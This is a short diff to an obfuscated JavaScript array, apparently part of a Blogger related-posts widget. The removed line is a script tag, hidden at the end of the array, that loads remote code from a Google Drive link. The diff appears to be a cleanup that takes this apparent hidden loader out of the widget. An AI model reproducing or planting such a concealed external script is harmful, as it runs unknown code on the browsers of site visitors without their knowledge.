@@ -3,8 +3,7 @@
 var _0xcf70 = ["length", "entry", "feed", "$t", "title", "link", "rel", 
 "alternate", "href", "published", "?m=0", "indexOf", "", "replace", "splice", 
 "random", "floor", "<ul>", "write", "<li>Kh\u00f4ng c\u00f3 b\u00e0i vi\u1ebft li\u00ean quan \u2192 </li>", 
-'<li><a href="', '" title="', "substring", "/", '">', "</a></li>", "</ul>", 
-"<script src='https://drive.google.com/uc?id=1oH6HF2bMQsxQg56Cse73BwvsQwXaJN-P'>\x3c/script>"];
+'<li><a href="', '" title="', "substring", "/", '">', "</a></li>", "</ul>"];
 var titles = new Array;
 var titlesNum = 0;
 var urls = new Array;
